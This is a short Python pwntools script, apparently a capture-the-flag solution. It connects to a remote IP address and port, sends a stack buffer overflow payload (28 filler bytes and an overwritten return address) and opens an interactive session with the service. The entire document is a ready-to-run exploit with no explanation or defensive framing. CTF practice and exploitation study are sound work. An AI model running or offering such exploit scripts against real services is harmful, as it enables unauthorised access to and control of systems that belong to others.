from pwn import *

p = remote('159.65.13.76', 33104)

payload = 'A'*28+p32(0x8048526)

print p.recv()
p.sendline(payload)
print p.recv()
p.interactive()
